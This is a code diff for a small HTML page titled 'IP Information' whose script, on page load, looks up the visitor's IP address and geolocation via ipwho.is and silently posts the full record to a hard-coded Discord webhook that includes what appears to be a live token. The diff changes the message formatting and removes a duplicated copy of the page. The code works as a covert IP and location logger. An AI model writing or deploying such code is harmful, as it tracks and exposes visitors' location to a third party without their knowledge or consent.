@@ -10,168 +10,76 @@ let FINALL = "";
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1564969198948589728/bhXE0ehqTxTRlPzDHtj9askJxYN4BYI9kE5XH2yEFprDrcwiDWUOLgHdDdN9s88_G-7L";
 
 function flattenObject(obj, prefix = "") {
-    const result = [];
+    let lines = [];
 
     for (const [key, value] of Object.entries(obj)) {
-        const name = prefix ? `${prefix}.${key}` : key;
+        const name = prefix
+            ? prefix + "-" + key
+            : key;
 
-        if (value !== null && typeof value === "object" && !Array.isArray(value)) {
-            result.push(...flattenObject(value, name));
+        if (value !== null && typeof value === "object") {
+            lines.push(...flattenObject(value, name));
         } else {
-            result.push({
-                name: name,
-                value: value === null ? "null" :
-                    Array.isArray(value) ? JSON.stringify(value) :
-                    String(value)
-            });
+            lines.push(`${name}: ||${value === null ? "null" : value}||`);
         }
     }
 
-    return result;
+    return lines;
 }
 
-fetch("https://ipwho.is/")
-.then(response => {
-    if (!response.ok) throw new Error("IP lookup failed");
-    return response.text();
-})
-.then(text => {
-    FINALL = text;
+async function sendReport() {
+    const response = await fetch("https://ipwho.is/");
 
-    const data = JSON.parse(FINALL);
-    const fields = flattenObject(data).map(item => ({
-        name: item.name,
-        value: item.value || "N/A",
-        inline: false
-    }));
-
-    const embed = {
-        title: "IP Information Report",
-        description: "Complete API response, formatted by field",
-        color: 3447003,
-        fields: fields.slice(0, 25),
-        footer: {
-            text: "Source: ipwho.is"
-        },
-        timestamp: new Date().toISOString()
-    };
-
-    const remaining = fields.slice(25);
-    const chunks = [];
-
-    for (let i = 0; i < remaining.length; i += 25) {
-        chunks.push({
-            title: `Additional Information ${Math.floor(i / 25) + 1}`,
-            color: 3447003,
-            fields: remaining.slice(i, i + 25)
-        });
+    if (!response.ok) {
+        throw new Error("IP lookup failed: " + response.status);
     }
 
-    const embeds = [embed, ...chunks];
+    FINALL = await response.text();
 
-    return fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ embeds })
-    });
-})
-.then(response => {
-    if (!response.ok) throw new Error("Webhook failed: " + response.status);
-    console.log("Report sent successfully!");
-})
-.catch(error => console.error("Error:", error));
-</script>
-</body>
-</html>
+    const data = JSON.parse(FINALL);
+    const lines = flattenObject(data);
+    const chunks = [];
+    let current = "";
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>IP Information</title>
-</head>
-<body>
-<script>
-let FINALL = "";
-const WEBHOOK_URL = "YOUR_WEBHOOK_URL";
+    for (const line of lines) {
+        const next = current ? current + "\n" + line : line;
 
-function flattenObject(obj, prefix = "") {
-    const result = [];
-
-    for (const [key, value] of Object.entries(obj)) {
-        const name = prefix ? `${prefix}.${key}` : key;
-
-        if (value !== null && typeof value === "object" && !Array.isArray(value)) {
-            result.push(...flattenObject(value, name));
+        if (next.length > 1900) {
+            chunks.push(current);
+            current = line;
         } else {
-            result.push({
-                name: name,
-                value: value === null ? "null" :
-                    Array.isArray(value) ? JSON.stringify(value) :
-                    String(value)
-            });
+            current = next;
         }
     }
 
-    return result;
-}
+    if (current) chunks.push(current);
 
-fetch("https://ipwho.is/")
-.then(response => {
-    if (!response.ok) throw new Error("IP lookup failed");
-    return response.text();
-})
-.then(text => {
-    FINALL = text;
+    for (let i = 0; i < chunks.length; i++) {
+        const content =
+            "```text\n" +
+            (chunks.length > 1
+                ? `--\nIP INFORMATION (${i + 1}/${chunks.length})\n`
+                : "IP INFORMATION\n") +
+            chunks[i] +
+            "\n```";
 
-    const data = JSON.parse(FINALL);
-    const fields = flattenObject(data).map(item => ({
-        name: item.name,
-        value: item.value || "N/A",
-        inline: false
-    }));
-
-    const embed = {
-        title: "IP Information Report",
-        description: "Complete API response, formatted by field",
-        color: 3447003,
-        fields: fields.slice(0, 25),
-        footer: {
-            text: "Source: ipwho.is"
-        },
-        timestamp: new Date().toISOString()
-    };
-
-    const remaining = fields.slice(25);
-    const chunks = [];
-
-    for (let i = 0; i < remaining.length; i += 25) {
-        chunks.push({
-            title: `Additional Information ${Math.floor(i / 25) + 1}`,
-            color: 3447003,
-            fields: remaining.slice(i, i + 25)
+        const result = await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ content })
         });
+
+        if (!result.ok) {
+            throw new Error("Webhook failed: " + result.status);
+        }
     }
 
-    const embeds = [embed, ...chunks];
-
-    return fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ embeds })
-    });
-})
-.then(response => {
-    if (!response.ok) throw new Error("Webhook failed: " + response.status);
     console.log("Report sent successfully!");
-})
-.catch(error => console.error("Error:", error));
+}
+
+sendReport().catch(error => console.error(error));
 </script>
 </body>
 </html>
-
-
